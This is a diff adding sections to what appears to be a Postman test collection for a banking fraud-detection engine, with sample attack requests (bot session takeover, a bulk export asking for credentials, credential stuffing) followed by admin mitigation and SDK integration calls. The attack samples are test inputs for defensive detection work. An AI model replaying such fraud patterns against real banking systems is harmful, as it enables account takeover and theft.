+                "value": "{\"typing_wpm\": 285.0, \"typing_rhythm_cv\": 0.0012, \"mouse_velocity_mean\": 0.0, \"mouse_velocity_cv\": 0.0, \"idle_time_ratio\": 0.0, \"keypress_dwell_ms\": 12.0, \"scroll_velocity\": 0.0}",
+                "description": "🔴 BOT biometrics: 285 WPM (4x human max), zero mouse motion, zero idle time, robotic keystroke timing"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"amount\": 150000,\n  \"to_account\": \"BOT-CONTROLLED-MULE-ACCT-5521\",\n  \"description\": \"Automated payment processing\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/banking/transfer",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "banking", "transfer"]
+            },
+            "description": "🔴 LAYER 6 ATTACK: Bot takeover of alice's session.\n- S5: Behavioral Biometrics = 0.95 (285 WPM is humanly impossible, max ~90 WPM)\n- S5: Mouse velocity = 0 (no mouse movement ever — pure keyboard automation)\n- S5: Keystroke rhythm CV = 0.0012 (machine-perfect timing, humans avg 0.15-0.35)\n- S3: Session drift detected (biometrics completely changed mid-session)\n\nExpected: CRITICAL block. War Room shows biometric anomaly alert."
+          }
+        },
+        {
+          "name": "L6-C. Direct Engine — Bot Biometrics Detailed Analysis",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"bot_demo_session_alice_001\",\n  \"user_id\": \"alice@neovault.com\",\n  \"ip\": \"198.51.100.99\",\n  \"path\": \"/api/banking/transfer\",\n  \"method\": \"POST\",\n  \"biometrics\": {\n    \"typing_wpm\": 285.0,\n    \"typing_rhythm_cv\": 0.0012,\n    \"mouse_velocity_mean\": 0.0,\n    \"mouse_velocity_cv\": 0.0,\n    \"idle_time_ratio\": 0.0,\n    \"keypress_dwell_ms\": 12.0,\n    \"scroll_velocity\": 0.0\n  },\n  \"payload\": {\n    \"amount\": 150000,\n    \"to_account\": \"BOT-MULE-5521\"\n  }\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/analyze",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "analyze"]
+            },
+            "description": "Direct engine call — shows exact behavioral_biometrics signal score + explanation in response JSON."
+          }
+        }
+      ]
+    },
+    {
+      "name": "LAYER 7 — ML Anomaly Detection (Pure AI — No Rules)",
+      "item": [
+        {
+          "name": "L7-A. 🚨 ATTACK — Novel ML Anomaly (Isolation Forest Catches)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"ml_anomaly_novel_session_2024\",\n  \"user_id\": \"alice@neovault.com\",\n  \"ip\": \"91.108.56.12\",\n  \"path\": \"/api/banking/accounts/bulk-export\",\n  \"method\": \"POST\",\n  \"payload\": {\n    \"export_type\": \"full_account_dump\",\n    \"format\": \"csv\",\n    \"include_transactions\": true,\n    \"include_credentials\": true,\n    \"date_range\": \"all\"\n  },\n  \"biometrics\": {\n    \"typing_wpm\": 142.0,\n    \"typing_rhythm_cv\": 0.04,\n    \"mouse_velocity_mean\": 8800.0,\n    \"mouse_velocity_cv\": 0.92,\n    \"idle_time_ratio\": 0.0\n  },\n  \"user_agent\": \"Go-http-client/2.0\",\n  \"device_fingerprint\": \"\"\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/analyze",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "analyze"]
+            },
+            "description": "🔴 LAYER 7 ATTACK: Multi-dimensional anomaly pattern that doesn't match any single rule but the ML ensemble catches:\n- Unusual endpoint (/bulk-export — high-risk endpoint risk S7)\n- Semi-normal IP but requesting account dump\n- Borderline biometrics (142 WPM — could be human, mouse_cv=0.92 unusual)\n- Go HTTP client (non-browser) as user_agent\n- No device fingerprint\n- Payload requests 'include_credentials=true' (never legitimate)\n\nIsolation Forest scores this as extreme outlier (isolation_forest_anomaly: true). LSTM autoencoder reconstruction error is high. Meta-classifier probability elevated.\n\nDemonstrates pure AI catch — no keyword rules match, only statistical anomaly."
+          }
+        },
+        {
+          "name": "L7-B. 🚨 ATTACK — Sequential Behavior Anomaly (Account Enumeration)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"enum_session_bot_sweep_2024\",\n  \"user_id\": null,\n  \"ip\": \"45.142.212.100\",\n  \"path\": \"/api/auth/login\",\n  \"method\": \"POST\",\n  \"payload\": {\n    \"email\": \"victim_{{$randomInt}}@neovault.com\",\n    \"password\": \"Password123\"\n  },\n  \"sequential_context\": {\n    \"prior_paths\": [\n      \"/api/auth/login\",\n      \"/api/auth/login\",\n      \"/api/auth/login\",\n      \"/api/auth/login\",\n      \"/api/auth/login\",\n      \"/api/auth/login\",\n      \"/api/auth/login\",\n      \"/api/auth/login\"\n    ],\n    \"response_codes\": [401, 401, 401, 401, 401, 401, 401, 401]\n  }\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/analyze",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "analyze"]
+            },
+            "description": "🔴 LAYER 7 ATTACK: Sequential behavior anomaly — credential stuffing / account enumeration.\n- S8: Sequential Behavior = high (repeated login attempts to different accounts)\n- S2: Velocity = high (rapid succession)\n- IP 45.142.212.100 = known threat ASN\n- Pattern: constant path + rotating user, all returning 401 = enumeration sweep"
+          }
+        },
+        {
+          "name": "L7-C. View ML Model Info",
           "request": {
             "method": "GET",
-            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
-            "url": "{{baseUrl}}/api/dashboard/admin"
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/model-info",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "model-info"]
+            },
+            "description": "Shows ML model versions, accuracy benchmarks (ROC-AUC: 0.89, Precision: 98.18%), and feature dimensions."
+          }
+        }
+      ]
+    },
+    {
+      "name": "MITIGATION — Admin Controls & Session Management",
+      "item": [
+        {
+          "name": "M1. View All Incidents (Audit Log)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/incidents?limit=20",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "incidents"],
+              "query": [{"key": "limit", "value": "20"}]
+            },
+            "description": "Shows all recorded security incidents in chronological order. Full audit trail."
+          }
+        },
+        {
+          "name": "M2. Revoke Session (Admin Action)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"{{session_id}}\"\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/revoke-session",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "revoke-session"]
+            },
+            "description": "Immediately revokes a session — blocks all future requests with this token. Can also use the session_id from any attack step."
+          }
+        },
+        {
+          "name": "M3. Whitelist Legitimate IP",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"127.0.0.1\"\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/admin/whitelist-ip",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "admin", "whitelist-ip"]
+            },
+            "description": "Whitelists an IP so it always gets fast-path allow (useful for restoring your own IP after testing)."
+          }
+        },
+        {
+          "name": "M4. Unlock Locked Account",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/admin/unlock/alice@neovault.com",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "admin", "unlock", "alice@neovault.com"]
+            },
+            "description": "Unlocks alice's account after it was locked by mitigation. Use after demos to reset state."
+          }
+        },
+        {
+          "name": "M5. Engine Stats (After Attacks)",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/stats",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "stats"]
+            },
+            "description": "Shows updated stats — total_inspections, blocked_count, avg_latency_ms. Compare with baseline from step 0d."
+          }
+        },
+        {
+          "name": "M6. Trigger Simulation Dashboard Sync",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"attack_type\": \"multi_vector_coordinated\",\n  \"threat_score\": 0.97,\n  \"ip\": \"185.220.101.5\"\n}"
+            },
+            "url": {
+              "raw": "{{neovault_url}}/api/security/mitigation/simulate",
+              "host": ["{{neovault_url}}"],
+              "path": ["api", "security", "mitigation", "simulate"]
+            },
+            "description": "Triggers a synthetic mitigation sequence on the Simulation Dashboard — shows all 8 mitigation steps firing in real-time on the dashboard UI."
+          }
+        }
+      ]
+    },
+    {
+      "name": "PUBLIC API — Banking Platform Integration (SDK Demo)",
+      "item": [
+        {
+          "name": "API-1. Inspect Request (Core SDK Method)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-API-Key", "value": "ts_live_your_api_key_here", "description": "Banking platform API key for TokenShield integration"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"bank_external_session_xyz789\",\n  \"user_id\": \"external_user_12345\",\n  \"ip\": \"203.0.113.100\",\n  \"path\": \"/api/payments/wire\",\n  \"method\": \"POST\",\n  \"payload\": {\n    \"amount\": 25000,\n    \"currency\": \"USD\",\n    \"destination\": \"IBAN-GB12BARC20040198765432\"\n  },\n  \"biometrics\": {\n    \"typing_wpm\": 71.0,\n    \"mouse_velocity_mean\": 380.0,\n    \"idle_time_ratio\": 0.18\n  },\n  \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\",\n  \"device_fingerprint\": \"external-bank-chrome-win10-fp-abc999\"\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/analyze",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "analyze"]
+            },
+            "description": "Primary integration endpoint for any external banking platform. Send any payment request through this — engine returns threat_score, action (allow/challenge/block), signals breakdown, and explainability narrative.\n\nIntegration pattern:\n1. Bank intercepts payment request\n2. Calls POST /api/v1/analyze\n3. If action=='allow' → proceed payment\n4. If action=='challenge' → trigger 2FA/step-up auth\n5. If action=='block' → reject + log incident"
+          }
+        },
+        {
+          "name": "API-2. Register Session (On Login)",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-API-Key", "value": "ts_live_your_api_key_here"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"bank_external_session_xyz789\",\n  \"user_id\": \"external_user_12345\",\n  \"ip\": \"203.0.113.100\",\n  \"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\",\n  \"device_fingerprint\": \"external-bank-chrome-win10-fp-abc999\"\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/register-session",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "register-session"]
+            },
+            "description": "Call this when user logs in to your banking platform. Establishes the legitimate baseline for geo, device, and behavioral signals."
+          }
+        },
+        {
+          "name": "API-3. Get Session Threat Score",
+          "request": {
+            "method": "GET",
+            "header": [
+              {"key": "X-API-Key", "value": "ts_live_your_api_key_here"}
+            ],
+            "url": {
+              "raw": "{{engine_url}}/api/v1/session/bank_external_session_xyz789/score",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "session", "bank_external_session_xyz789", "score"]
+            },
+            "description": "Poll current threat level for any session. Useful for real-time risk dashboard in your banking portal."
+          }
+        },
+        {
+          "name": "API-4. Revoke Compromised Session",
+          "request": {
+            "method": "POST",
+            "header": [
+              {"key": "Content-Type", "value": "application/json"},
+              {"key": "X-API-Key", "value": "ts_live_your_api_key_here"}
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"session_id\": \"bank_external_session_xyz789\"\n}"
+            },
+            "url": {
+              "raw": "{{engine_url}}/api/v1/revoke-session",
+              "host": ["{{engine_url}}"],
+              "path": ["api", "v1", "revoke-session"]
+            },
+            "description": "Immediately blacklists a session across all Redis caches and engine state. Call this when your banking system detects any fraud signal independently."
+          }
+        },
+        {
+          "name": "API-5. Get Engine Health (Uptime Check)",
+          "request": {
+            "method": "GET",
+            "header": [
+              {"key": "X-API-Key", "value": "ts_live_your_api_key_here"}
+            ],
+            "url": {
+              "raw": "{{engine_url}}/health",
+              "host": ["{{engine_url}}"],
+              "path": ["health"]
+            },
+            "description": "Use for uptime monitoring. Should respond <50ms. Check models field to verify all 3 ML models (IF/LSTM/Meta) are loaded."
           }
         }
       ]
